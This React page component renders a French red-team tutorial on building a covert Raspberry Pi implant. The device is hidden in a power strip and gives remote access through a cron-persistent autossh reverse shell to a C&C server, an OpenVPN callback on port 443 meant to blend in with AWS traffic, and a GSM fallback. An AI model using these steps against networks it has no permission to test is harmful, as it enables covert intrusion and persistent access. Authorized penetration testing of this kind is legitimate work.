import React from 'react';
import HackThePlanet from "../img/hacktheplanet.gif"
import Hide from "../img/hide_raspberry.jpg"
import Methodo from "../img/methodo.jpg"
import KaliRaspberry from "../img/kali_raspberry.png"
import Raspap from "../img/raspap_01.png"



class Redteam extends React.Component {
    render() {
      return (
      <div className="article">

        <h1>Redteam</h1>
   
        <hr/>
        <p className="tabulation">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent aujourd’hui passer des mois sur une seule et même cible, <strong>APT (Advanced Persitent Threat).</strong></p>

        <p className="tabulation">Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : le <strong>RedTeam</strong>. <br/><br/>L’objectif est de dérouler un scénario complet d'attaque depuis l'externe jusqu’à l'interne et la capacité d'effectuer des actions critiques au sein du SI ciblé. Par rapport à un pentest traditionnel la durée est généralement plus longue et les moyens, plus variés (ex: phishing des employés, intrusions physiques dans les locaux).</p>

        <img id="hacktheplanet" src={HackThePlanet} alt="hack the planet"></img>

        <h2>Contexte</h2>
        <p className="tabulation">Notre projet consiste à créer un implant qu'il suffira de déposer chez un client pour avoir un accès à distance au réseau interne. Cela représente la phase de compromission initiale dans le schéma de redteam suivant: <br/>

        <img id="methodoredteam" src={Methodo} alt="méthodologie redteam"/>
        <br/>  

        Le scénario de la mission sera de pénétrer physiquement dans la société et d'y dissimuler notre backdoor pour obtenir un accès à distance via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  

        Des outils tels que la <strong>LAN Turtle</strong> existent déjà mais l'on souhaite avoir le contrôle total de nos outils. <br/><br/>
        
        Plusieurs méthodes se doivent d'être implémentées au cas où des règles de pare-feu bloqueraient certains flux sortants et une méthode alternative de connexion via Wifi ou GSM est également à envisager.
        </p>

        <img id="kaliraspberry" src={KaliRaspberry} alt="kali raspberry"/>

        <h2>Cahier des charges de la box</h2>
        <div>
        Plusieurs appareils peuvent convenir, les critères principaux étant sa fiabilité, sa légèreté, sa taille, sa rapidité et son coût:
            <ul>
                <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>
                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et/ou <strong>OpenVPN</strong> pour le serveur de contrôle</li>
                <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>
                <li>matériel <strong>rapide</strong></li>
                <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>
                <li>possibilité d'ajouter des modules éventuels</li>
            </ul>
        Il existe de nombreux appareils comme le Hardkernel ODROID-N2 ou encore le Beaglebone Black mais au vu du prix, de la simplicité, et des autres critères, on préférera utiliser une <strong>Raspberry Pi.</strong></div>

        <br/>

        <h2>Shopping list pour le matériel</h2>
        <div>
          <ul>
            <li><a href="https://www.canakit.com/raspberry-pi-4-starter-kit.html">Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $100</a></li>
            <li><a href="https://www.amazon.com/dp/B07FCMBLV6">SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15</a></li>
            <li><a href="https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan">Raspberry Pi 4 Case with Fan - $10 (optional)</a></li>
            <li><a href="https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1">Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)</a></li>
          </ul>
        </div>

        <br/>

        <h2>Système d'exploitation</h2>
        <p className="tabulation">On retiendra la distribution <strong>Kali Linux</strong> car elle dispose déjà d'outils de pentest intégrés, pas besoin d'installation et c'est simple à utiliser pour tous pentesters.</p>
        
        <br/>

        <h2>Wifi</h2>
        <p className="tabulation">La Raspberry Pi 4 dispose déjà d'une carte sans fil intégrée (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et gère l'<strong>injection de paquets</strong> et <strong>le mode moniteur</strong> (contrairement à la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure portée lors d'attaques sans fil.

        Un adaptateur sans fil doté d'un <strong>chipset RT5370</strong> serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme <strong>Aireplay-ng</strong>, il a une large bande de fréquences utilisables. Ainsi on peut se connecter à un adaptateur via <strong>hostapd</strong>et utiliser l'autre adaptateur afin de réaliser les attaques.</p>
        
        <br/>

        <h2>Comment dissimuler la Raspberry ?</h2>
        <p>Une méthode efficace est de la cacher à l'intérieur d'une multiprise comme suit :</p>
        <img id="hide_raspberry" src={Hide} alt="idée pour chacher raspberry"/>

        <p>Cet objet du quotidien dans une entreprise a l'avantage de fournir l'alimentation et le câble réseau à la carte sans éveiller trop de soupçons de la part des employés</p>
        <hr/>

        <h2>Configuration initiale</h2>
        <div>
          <ol>
            <li>Installer l'image Kali pour la carte MicroSD</li>
            <li>Configurer un point d'accès WiFi</li>
            <li>Configurer un tunnel SSH inverse automatique</li>
            <li>Configurer le client et le serveur OpenVPN</li>
          </ol>
        </div>
        <h3>Installation de Kali Linux</h3>
        <a href="https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8">Kali Linux</a>

        <br/>
        <br/>

        <div>
          <h4>Pour Windows</h4>
          Connectez la carte MicroSD à la machine Windows. <br/>
          Décompressez l'archive.<br/>
          Utilisez Win32DiskImager ou Rufus pour écrire l'image disque Kali sur la carte MicroSD.<br/>

          <br/> 

          <h4>Pour Linux</h4>
          Connectez la carte MicroSD au système Linux.<br/>
          Utilisez la commande <strong>dd</strong> pour créer l'image du fichier Kali sur la carte MicroSD.<br/>

          <br/>

          <h4>Installation</h4>
          Alimentez la Raspberry, connectez clavier/souris/écran et connectez-vous à Kali Linux avec le nom d'utilisateur "root" et le mot de passe "toor".<br/>
          Veillez à connecter un câble Ethernet sur la Raspberry pour l'accès internet elle devrait alors récupérer automatiquement une adresse IP via DHCP.
          
        </div>

        <br/>

        <h3>Configurer un point d'accès Wifi</h3>

        <p>On va utiliser l'outil <strong>raspAP</strong> pour mettre en place un point d'accès Wifi sur notre Raspberry :</p>

        <div id="wifi">yes | curl -sL https://install.raspap.com | bash</div>

        <p>Après le reboot, raspAP a mis en place toute la configuration de l'Access Point (AP) !<br/><br/>

        Le <strong>DHCP</strong> distribue des adresses entre 10.3.141.50 et 10.3.141.255. Ainsi lorsqu’un appareil (PC, smartphone, tablette...) se connectera sur ce Wifi, une adresse IP comprise entre ces deux valeurs lui sera fournie.<br/><br/>

        On accède à l’interface d’administration via une page web, en se connectant sur l’adresse IP : 10.3.141.1. On peut le faire en local sur la Raspberry Pi/AP ou depuis une autre machine connectée à l’AP.<br/><br/>

        Les paramètres par défaut sont :</p>
        <ul>
          <li>Adresse IP : 10.3.141.1/24  et  169.254.218.244/16</li>
          <li>Nom d’utilisateur : admin</li>
          <li>Mot de passe : secret</li>
          <li>Plage DHCP : 10.3.141.50-255</li>
          <li>SSID : raspi-webgui</li>
          <li>Mot de passe du SSID : ChangeMe</li>
        </ul>

        <img id="raspap" src={Raspap} alt="raspap_AP"/>

        {/* Installation manuelle (sans raspap)
        <div id="wifi">apt-get install hostapd <br/>
        apt-get install pciutils<br/>

        nano /etc/network/interfaces<br/><br/>
        ##Le fichier /etc/network/interfaces devrait ressembler à:<br/>

        auto lo<br/>
        iface lo inet loopback<br/>
        auto eth0<br/>
        iface eth0 inet dhcp<br/>
        auto wlan0<br/>
        allow-hotplug wlan0<br/>
        iface wlan0 inet static<br/>
        address 172.16.66.1<br/>
        netmask 255.255.255.0<br/>
        gateway 172.16.66.1<br/>
        
        <br/>

        ##Install a DHCP server that will serve WiFi clients:<br/><br/>

        apt-get install udhcpd<br/>

        nano /etc/udhcpd.conf<br/><br/>
        ##Add the following to the end of the file:<br/><br/>

        start           172.16.66.50<br/>
        end             172.16.66.70<br/>
        interface       wlan0<br/>
        # Optional<br/>
        opt     dns     1.1.1.1<br/>
        option  subnet  255.255.255.0<br/>
        opt     router  172.16.66.1<br/>
        option  domain  local<br/>
        <br/>
        ##Create a file for udhcpd.leases:<br/><br/>

        touch /var/lib/misc/udhcpd.leases<br/>
        ##Edit the /etc/default/udhcpd file <br/>and change the DHCPD_ENABLED=”no” to “yes”:<br/><br/>

        DHCPD_ENABLED=”yes”<br/>
        ##Create the file /etc/hostapd/hostapd.conf<br/><br/>

        nano /etc/hostapd/hostapd.conf<br/>
        ##Copy the following into the hostapd.conf file :<br/><br/>

        # Interface configuration<br/>
        interface=wlan0<br/>
        ssid=iphone10<br/>
        channel=6<br/><br/>

        # WPA Configuration<br/>
        macaddr_acl=0<br/>
        auth_algs=1<br/>
        ignore_broadcast_ssid=0<br/>
        wpa=2<br/>
        wpa_passphrase=SuperSecretSquirrel<br/>
        wpa_key_mgmt=WPA-PSK<br/>
        rsn_pairwise=CCMP<br/>

        #Hardware Configuration<br/>
        driver=nl80211<br/>
        ieee80211n=1<br/>
        hw_mode=g<br/>
        wmm_enabled=1<br/><br/>


        nano /etc/init.d/hostapd<br/>
        ##Change the line to the following:<br/><br/>

        DAEMON_CONF=/etc/hostapd/hostapd.conf<br/><br/>

        nano /etc/default/hostapd<br/>
        ##Change the line to the following:<br/><br/>

        DAEMON_CONF="/etc/hostapd/hostapd.conf"

        update-rc.d hostapd enable
        ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:<br/><br/>

        sysctl -w net.ipv4.ip_forward=1<br/><br/>

        nano /etc/sysctl.conf<br/>
        [Remove the “#” in front of net.ipv4.ip_forward=1]<br/><br/>

        Finally, use your IPTables-magic to masquerade client connections to the Internet:<br/><br/>

        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br/>
        There is a package available in Kali to make these changes to IPTables last.<br/><br/>

        apt-get install iptables-persistent<br/>
        iptables-save > /etc/iptables/rules.v4<br/><br/>
        ##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:<br/><br/>

        nano /etc/network/if-pre-up.d/iptables<br/>
        Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:<br/><br/>

        #!/bin/bash<br/>
        /usr/sbin/iptables-restore {'<'} /etc/iptables/rules.v4<br/><br/>

        chmod +x /etc/network/if-pre-up.d/iptables<br/>

        reboot<br/>
        ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.
        </div> */}

        <h3>Configurer un reverse shell automatique</h3>
        <p>Pour cette partie on doit disposer d'un serveur de commande et de contrôle (C&C) accessible sur Internet avec SSH d'activé. Pour le POC j'ai pour le moment utilisé mon serveur perso ^^</p>   

        <div id="wifi">
        apt install autossh <br/>
        ssh-keygen (laisser les paramètres par défaut) 
        </div>


        <div id="wifi">scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/</div>


        <strong>[Sur le serveur]</strong><br/>
        Ajouter le contenu id_rsa.pub à ~/.ssh/authorized_keys ou bien créer ce fichier:<br/>

        <div id="wifi">cat id_rsa.pub >> ~/.ssh/authorized_keys</div>

        <p><strong>[Sur la Raspberry]</strong><br/>
        On va créer une crontab qui exécute autossh après chaque boot et est relancée toutes les 5 min (en cas de coupure de connexion)</p>

        <div id="wifi">
        vim /bin/autossh-connect.sh<br/>

        #!/bin/bash<br/>
        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] &</div>

        -N: n'exécute pas de cmd sur la machine intermédiaire<br/>
        -f: lancé en tache de fond<br/>
        <br/>
        <div id="wifi">chmod u+rwx,g+xr,o+x autossh-connect.sh</div>

        <div id="wifi">
        crontab -e<br/>
        
        #Ajouter à la fin du fichier : <br/>

        @reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1<br/>
        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>
        </div>
        
        <p>Voilà, à présent la RaspBerry va se connecter à chaque boot à notre serveur de commande et contrôle</p>
        <p>Exécutez la commande suivante sur le serveur pour obtenir le reverse shell :</p>

        <div id="wifi">ssh root@localhost -p 6667 (credentials par défaut de Kali)</div>      
        
        <h3>Configurer un client et un serveur OpenVPN</h3>
        <p className="tabulation">Une garantie d'accès en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.
        </p>

        <p>Cela se fait en 3 étapes :</p>
        <ul>
          <li>Configuration d'OpenVPN Access Server sur le net</li>
          <li>Configuration de la Raspberry</li>
          <li>Configuration de la machine d'attaque</li>
        </ul>

        <br/>

        <h3>Mise en place OpenVPN Access Server</h3>
        <p className="tabulation">Pour la solution d'hébergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides à mettre en place.<br/>

        <strong>Vultr.com</strong> et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS bon marché et simples à configurer. L'autre raison de ce choix est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret dans le réseau. 
        </p>

        <ol>
          <li>Allez sur <a href="https://aws.amazon.com/lightsail/">Lien VPS amazon</a>, se connecter puis créer un nouveau VPS</li>

          Une fois crée, Manage -> Networking

          Ajoutez 2 règles firewall sur les ports (443 et 943)

          <li>Installez un OS (par exemple Ubuntu). Faire un chmod 600 de la SSH key et se connectez sur le VPS server à partir de la machine d'attaque : </li>
          ssh -i LightsailDefaultPrivateKey-us-west-2.pem user@[IP] <br/>
          sudo su -
          <li>mettre à jour le serveur:</li>
          <li>Installez OpenVPN AS</li>
          <p>apt update && apt -y install ca-certificates wget net-tools <br/>
            wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>
            echo "deb http://as-repository.openvpn.net/as/debian bionic main">/etc/apt/sources.list.d/openvpn-as-repo.list <br/>
            apt update && apt -y install openvpn-as <br/>
          </p>

      
          <li>Supprimez le profil actuel et configurez OpenVPN:</li>
          /usr/local/openvpn_as/bin/ovpn-init
          <li>Tapez DELETE: (sensible à la casse)</li>
          <li>Finir l'installation comme suit</li>
        </ol>
        <p>Accept EULA: yes <br/>
          Will this be the primary Access Server node: yes <br/>
          Please specify the network interface and IP address to be <br/>
          used by the Admin Web UI: <br/>
          (1) all interfaces: 0.0.0.0 <br/>
          (2) eth0: 45.77.217.54 <br/>
          Answer: 1 <br/>
          Please specify the port number for the Admin Web UI. <br/>
          Answer: 943 <br/>
          Please specify the TCP port number for the OpenVPN Daemon <br/>
          Answer: 443 <br/>
          Should client traffic be routed by default through the VPN? <br/>
          Answer: YES <br/>
          Should client DNS traffic be routed by default through the VPN? <br/>
          Answer: YES <br/>
          Use local authentication via internal DB? <br/>
          > Press ENTER for default [no]:  <br/>
          Answer: YES <br/>
          The rest of these answers should be default. Simply hit the 'Enter' key <br/>
          
          passwd openvpn <br/>
          At the prompt, set a password for the user openvpn.<br/>

          Connect to the admin page and login using the openvpn user with the new password.<br/>

          https://server-ip:943/admin/<br/>
          </p>

          <br/>

          <h3>Configuration de OpenVPN AS Server</h3>
          <ol>
            <li>Allez sur https://[IP Address du serveur VPS]:943/admin/</li>
            <li>Se connecter avec le compte "openvpn" et le mot de passe récemment crée <br/>
            Note: Si vous utilisez AWS Lightsail, assurez-vous dans les paramètres que le nom d'hôte ou l'adresse IP est l'adresse IP publique et non la privée, puis enregistrez et mettez à jour.</li>
            <li>Dans OpenVPN, vérifiez que l'authentification est définie sur locale: <br/>
            Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server</li>
            <li>Allez sur User Management -> User Permissions<br/>
            Créez un utilisateur : redteam et activez l'option<br/>
            Set AllowAuto-login</li>
            <li>Activez les autorisations de l'utilisateur: -> More settings<br/>
            All server-side private subnets<br/>
            All other VPN clients</li>
          </ol>

          <br/>
          <h3>Télécharger les profils OpenVPN</h3>
          <ol>
            <li>Se connecter et télécharger les profils https://[Your VPS]:943/?src=connect</li>
            <li>Pour chaque utilisateur se connecter et télécharger le profil</li>
            <li>Sauvegarder redteam.ovpn</li>
          </ol>

          <br/>

          <h3>Configuration de la Raspberry Pi 4</h3>
          <li>Allumez la Raspberry Pi 4 et branchez un câble ethernet</li>
          <li>Configurez le démarrage automatique de OpenVPN dans le fichier :<br/>
          nano /etc/default/openvpn <br/>
          [Décommentez ‘AUTOSTART=”all”’]</li>
          <li>Copiez client.ovpn sur la Raspberry dans /etc/openvpn/</li>
          <li>Renommez le en client.conf</li>
          <li>Activez OpenVPN pour démarrer au boot: <br/>update-rc.d openvpn enable</li>
          <li>Puis reboot</li>

          <p className="tabulation">Cela va lancer le client OpenVPN sur la Raspberry. Pour vous assurer que cela fonctionne, retournez dans votre serveur OpenVPN AS et vérifiez les connexions. Accédez à "Utilisateurs actuels" dans le menu État et vous devriez voir le nom d'utilisateur "redteam" avec l'adresse réelle comme adresse WAN externe de l'endroit où la Raspberry Pi 4 est branchée et une adresse VPN. <br/><br/>
          
          Nous avons à présent la Raspberry Pi 4 configurée de sorte que dès lors qu'elle se connecte à un réseau, elle va chercher à se reconnecter à notre serveur VPN.</p>

          <br/>

          <h3>Configuration GSM pour la box</h3>

          <p>Lien pour dongle : <a href="http://shop.mchobby.be/product.php?id_product=677">dongle GSM (23,60€)</a>    (module 3G HSDPA, support SMS et connexion internet)</p>


          <p className="tabulation">Ce module permet d'établir des connexions Internet via le réseau 3G... et d'obtenir une connexion Internet là où vous ne disposez pas d'ADSL, de ligne téléphonique classique, ou de WiFi.</p>

          <p>Editer le fichier <strong>config.txt</strong> dans le dossier /boot/ <br/>
          Ajouter la ligne suivante: <strong>max_usb_current=1</strong><br/>
          Après reboot, vous pouvez brancher la clef USB à la Raspberry <br/><br/>

          La commande <strong>lsusb</strong> devrait la faire apparaître dans la liste. Sinon vérifiez le matériel et la connectique.
          <br/><br/>

          $ sudo apt-get update <br/>
          $ sudo apt-get install ppp wvdial<br/>
          </p>

          <h4>Configuration de wvdial</h4>

          <p>Le fichier de configuration de wvdial se trouve dans le dossier <strong>/etc/wvdial.conf</strong>
          <br/><br/>

          sudo nano /etc/wvdial.conf<br/><br/>

          Le fichier de configuration est un fichier texte comme celui-ci dessous :

          <div id="wifi">
          [Dialer Defaults]<br/>
          Init1 = ATZ<br/>
          Init2 = ATQ0 V1 E1 S0=0 &C1 &D2<br/>
          Init3 = AT+CGDCONT=1,"IP","web.be"<br/>
          Stupid Mode = 1<br/>
          Modem Type = Analog Modem<br/>
          ISDN = 0<br/>
          New PPPD = yes<br/>
          Phone = *99#<br/>
          Modem = /dev/ttyUSB0<br/>
          Username = web<br/>
          Password = web<br/>
          Baud = 9600
          </div>

          Les paramètres web.be, web, web sont des paramètres propres aux opérateurs 3G (web.be, web, web sont les paramètres pour l'opérateur MobileVikings).<br/><br/>

          <strong>Pour Mobistar (Orange Belgique)</strong><br/>
          A la place de web.be rentrez mworld.be, (business: entrez web.pro.be)<br/>
          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = ''<br/>
          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = ''<br/><br/>

          <strong>Pour Proximus</strong><br/>
          A la place de web.be rentrez internet.proximus.be<br/>
          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = ''<br/>
          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = ''<br/><br/>

          <strong>Pour Base</strong><br/>
          A la place de web.be rentrez gprs.base.be<br/>
          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = 'base'<br/>
          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = 'base'
          </p>

          <p>Une fois wvdial configuré, il suffit de taper la commande <strong>sudo wvdial </strong> afin de lancer la connexion 3G.Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera le temps pendant laquelle la connexion a été maintenue.</p>
         
      </div>
      );
    }
  }

  export default Redteam;  